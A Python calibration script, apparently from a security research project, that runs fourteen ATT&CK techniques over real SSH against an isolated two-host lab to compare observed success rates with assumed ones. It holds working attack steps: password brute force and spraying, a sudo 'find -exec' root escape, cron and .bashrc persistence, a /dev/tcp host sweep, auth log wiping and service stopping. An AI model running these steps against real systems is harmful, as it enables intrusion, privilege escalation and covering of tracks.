# -*- coding: utf-8 -*-
"""Calibrate the techniques a web application cannot host, against a real range.

WHY THIS EXISTS

Section 4.8 executes fifteen of the forty-five techniques against a deliberately
vulnerable web application and finds every assumed success probability optimistic.
The other thirty are not assumed out of laziness: a single Flask process has no
privilege boundary to escalate across, no second host to move to, no service to
stop and no system log to clear, so those techniques have nowhere to run. The
paper says so, and names a small instrumented range as the way to reach them.

This is that range's client. `lab/docker-compose.yml` brings up two Debian hosts
on an isolated network with weak accounts, a sudo rule that permits a shell
escape, a credential in a configuration file, a writable cron directory and a
real system log. Everything below authenticates over real SSH and runs real
commands. Nothing consults a probability.

WHAT IT ADDS OVER THE WEB TARGET

  new       PRIV_ESC_SUDO, REMOTE_SYSTEM_DISCOVERY, SCHEDULED_TASK,
            INSTALL_BACKDOOR, SERVICE_STOP, and lateral movement over SSH
  upgraded  BRUTE_FORCE_SSH, PASSWORD_SPRAYING and VALID_ACCOUNTS_LOGIN move
            from an HTTP stand-in to real SSH authentication; CLEAR_LOGS moves
            from an application-level list to a real /var/log; CREDS_IN_FILES
            moves from a served file to a real one on disk

As in Section 4.8, each executor draws from a mix of competent and incompetent
tradecraft, because that variation is what a success probability stands in for.
The same caveat therefore applies: the level these rates settle at is a property
of the mix as much as of the target.

REQUIREMENTS

    pip install paramiko
    docker compose -f lab/docker-compose.yml up -d --build

SAFETY

The range is `internal: true`, so no container can reach the internet, and no
port is published. Every credential is fictional and lives only in the compose
file. Point this at nothing else.

    python analysis/v5_calibration_lab.py --trials 300
"""
import argparse
import io
import json
import os
import random
import string
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from env.kill_chain_v5 import TECHNIQUES_V5

FOOTHOLD = "172.31.0.10"
TARGET = "172.31.0.20"
OUT = "results/v5_calibration_lab.json"

GOOD = [("alice", "Summer2024!"), ("bob", "Password1"), ("svc_backup", "backup")]
MIXED = GOOD + [("alice", "Summer2023!"), ("carol", "Password1"), ("bob", "Autumn2024")]

SUDO_ESCAPE = r"sudo -n /usr/bin/find /etc -maxdepth 0 -exec id \; 2>/dev/null"


def _ssh(host, user, password, timeout=6):
    """One real authentication attempt. Returns a client, or None on refusal."""
    import paramiko
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(host, username=user, password=password, timeout=timeout,
                  allow_agent=False, look_for_keys=False, banner_timeout=timeout)
        return c
    except Exception:
        try:
            c.close()
        except Exception:
            pass
        return None


def _run(c, cmd, timeout=15):
    _in, out, err = c.exec_command(cmd, timeout=timeout)
    return out.read().decode(errors="ignore"), err.read().decode(errors="ignore")


def _as(host, rng, creds=MIXED):
    """Authenticate with a credential drawn from a mix that is not all correct."""
    u, pw = rng.choice(creds)
    return _ssh(host, u, pw)


# -- executors ---------------------------------------------------------------
def brute_force_ssh(rng):
    """T1110. Many passwords against one account, over real SSH."""
    user = rng.choice(["alice", "bob", "svc_backup", "dave"])
    guesses = ["Password1", "Summer2024!", "backup", "letmein", "Welcome1"]
    rng.shuffle(guesses)
    for pw in guesses[:rng.randint(2, 5)]:
        c = _ssh(FOOTHOLD, user, pw)
        if c:
            c.close()
            return True
    return False


def password_spraying(rng):
    """T1110.003. One password against many accounts."""
    pw = rng.choice(["Password1", "Summer2024!", "Welcome1"])
    for user in ("alice", "bob", "carol", "svc_backup"):
        c = _ssh(FOOTHOLD, user, pw)
        if c:
            c.close()
            return True
    return False


def valid_accounts(rng):
    """T1078. Reuse a stolen credential against the second host."""
    c = _as(TARGET, rng)
    if not c:
        return False
    c.close()
    return True


def creds_in_files(rng):
    """T1552.001. Read a credential out of a real configuration file."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    path = rng.choice(["/etc/app/config.ini", "/etc/app/config.ini", "/etc/app/db.ini"])
    out, _ = _run(c, "cat " + path + " 2>/dev/null")
    c.close()
    return "password" in out.lower()


def priv_esc_sudo(rng):
    """T1068. Escape to root through a sudo rule that should not exist.

    `sudo find . -exec <cmd> ;` runs the command as root. The rule is granted to
    one account only, so an operator on the wrong account fails for real.
    """
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    if rng.random() < 0.7:          # a competent operator enumerates first
        out, _ = _run(c, "sudo -n -l 2>/dev/null")
        if "find" not in out:
            c.close()
            return False
    out, _ = _run(c, SUDO_ESCAPE)
    c.close()
    return "uid=0(root)" in out


def remote_system_discovery(rng):
    """T1018. Find the other host on the range, for real."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    sweep = ("for i in $(seq 1 30); do (echo > /dev/tcp/172.31.0.$i/22) "
             "2>/dev/null && echo up:172.31.0.$i; done")
    cmd = rng.choice([sweep, sweep, "ip neigh show; ip route show"])
    out, _ = _run(c, cmd, timeout=40)
    c.close()
    return "172.31.0.20" in out


def scheduled_task(rng):
    """T1053.003. Persistence through a writable cron directory."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    name = "lab_" + "".join(rng.choice(string.ascii_lowercase) for _ in range(5))
    path = rng.choice(["/etc/cron.d/" + name, "/etc/cron.d/" + name,
                       "/etc/crontab.d/" + name])
    _run(c, "printf '* * * * * root /bin/true\\n' > " + path + " 2>/dev/null")
    out, _ = _run(c, "test -f " + path + " && echo ok")
    c.close()
    return out.strip() == "ok"


def install_backdoor(rng):
    """T1543. Persistence written into a startup file."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    target = rng.choice(["~/.bashrc", "~/.bashrc", "/etc/rc.local"])
    _run(c, "echo \"nohup /bin/sh -c 'sleep 3600' >/dev/null 2>&1 &\" >> "
            + target + " 2>/dev/null")
    out, _ = _run(c, "grep -c 'sleep 3600' " + target + " 2>/dev/null")
    c.close()
    return out.strip().isdigit() and int(out.strip()) > 0


def lateral_move_ssh(rng):
    """T1021.004. Move to the second host with a credential from the first."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    c.close()
    c2 = _as(TARGET, rng)
    if not c2:
        return False
    out, _ = _run(c2, "hostname")
    c2.close()
    return out.strip() == "target"


def clear_logs(rng):
    """T1070. Clear a real system log, which needs the privilege to write it."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    path = rng.choice(["/var/log/auth.log", "/var/log/auth.log", "/var/log/secure"])
    _run(c, ": > " + path + " 2>/dev/null")
    out, _ = _run(c, "wc -c < " + path + " 2>/dev/null")
    c.close()
    try:
        return int(out.strip()) == 0
    except ValueError:
        return False


def data_from_local_system(rng):
    """T1005. Stage the document share."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    pattern = rng.choice(["report", "report", "invoice"])
    out, _ = _run(c, "ls /srv/share/ | grep -c " + pattern)
    c.close()
    return out.strip().isdigit() and int(out.strip()) > 0


def archive_collected_data(rng):
    """T1560.001. Package what was staged, into a real archive."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    tok = "t%d" % rng.randrange(10 ** 6)
    pattern = "report" if rng.random() < 0.8 else "nothing"
    _run(c, "tar czf /tmp/%s.tgz /srv/share/*%s* 2>/dev/null" % (tok, pattern))
    out, _ = _run(c, "test -s /tmp/%s.tgz && echo ok" % tok)
    c.close()
    return out.strip() == "ok"


def service_stop(rng):
    """T1489. Stop a running service, which needs root."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    svc = rng.choice(["cron", "cron", "rsyslog", "nginx"])
    _run(c, SUDO_ESCAPE.replace("-exec id \\;",
                                "-exec service %s stop \\;" % svc))
    out, _ = _run(c, "service %s status 2>/dev/null; echo rc=$?" % svc)
    c.close()
    return "is not running" in out or "rc=3" in out


def system_info_discovery(rng):
    """T1082. Fingerprint the host, for real."""
    c = _as(FOOTHOLD, rng)
    if not c:
        return False
    cmd = rng.choice(["uname -a; hostname", "uname -a; hostname", "systeminfo"])
    out, _ = _run(c, cmd)
    c.close()
    return "Linux" in out and "foothold" in out


EXECUTORS = [
    ("BRUTE_FORCE_SSH",         "many passwords, one account (real SSH)", brute_force_ssh),
    ("PASSWORD_SPRAYING",       "one password, many accounts (real SSH)", password_spraying),
    ("VALID_ACCOUNTS_LOGIN",    "reuse a credential on a second host",    valid_accounts),
    ("CREDS_IN_FILES",          "read a real configuration file",         creds_in_files),
    ("PRIV_ESC_SUDO",           "sudo shell escape to root",              priv_esc_sudo),
    ("REMOTE_SYSTEM_DISCOVERY", "find the second host on the network",    remote_system_discovery),
    ("SCHEDULED_TASK",          "persistence via a cron directory",       scheduled_task),
    ("INSTALL_BACKDOOR",        "persistence via a startup file",         install_backdoor),
    ("LATERAL_MOVE_SMB",        "move to the second host over SSH",       lateral_move_ssh),
    ("CLEAR_LOGS",              "clear a real system log",                clear_logs),
    ("DATA_FROM_LOCAL_SYSTEM",  "stage a real document share",            data_from_local_system),
    ("ARCHIVE_COLLECTED_DATA",  "package it into a real archive",         archive_collected_data),
    ("SERVICE_STOP",            "stop a running service",                 service_stop),
    ("SYSTEM_INFO_DISCOVERY",   "fingerprint the host",                   system_info_discovery),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--trials", type=int, default=300)
    ap.add_argument("--seed", type=int, default=2026)
    a = ap.parse_args()
    try:
        import paramiko  # noqa: F401
    except ImportError:
        raise SystemExit("this needs paramiko:  pip install paramiko")

    rng = random.Random(a.seed)
    rows = []
    print("%d real executions per row, against the range in lab/\n" % a.trials)
    print("%-28s%-42s%9s%10s%8s" % ("technique", "variant", "assumed",
                                    "observed", "gap"))
    for tech, variant, fn in EXECUTORS:
        assumed = TECHNIQUES_V5[tech].success_prob
        hits = 0
        for _ in range(a.trials):
            try:
                hits += bool(fn(rng))
            except Exception:
                pass                      # a failed attempt is a failed attempt
        observed = hits / a.trials
        rows.append({"technique": tech, "variant": variant, "assumed": assumed,
                     "observed": observed, "gap": observed - assumed,
                     "trials": a.trials})
        print("%-28s%-42s%9.2f%10.2f%+8.2f"
              % (tech, variant, assumed, observed, observed - assumed))

    gaps = [abs(r["gap"]) for r in rows]
    mean_abs = sum(gaps) / len(gaps)
    print("\nmean absolute gap %.3f over %d measurements" % (mean_abs, len(rows)))
    print("all optimistic: %s" % all(r["gap"] < 0 for r in rows))
    with io.open(OUT, "w", encoding="utf-8") as f:
        json.dump({"trials": a.trials, "rows": rows, "mean_abs_gap": mean_abs},
                  f, indent=1)
    print("wrote %s" % OUT)


if __name__ == "__main__":
    main()
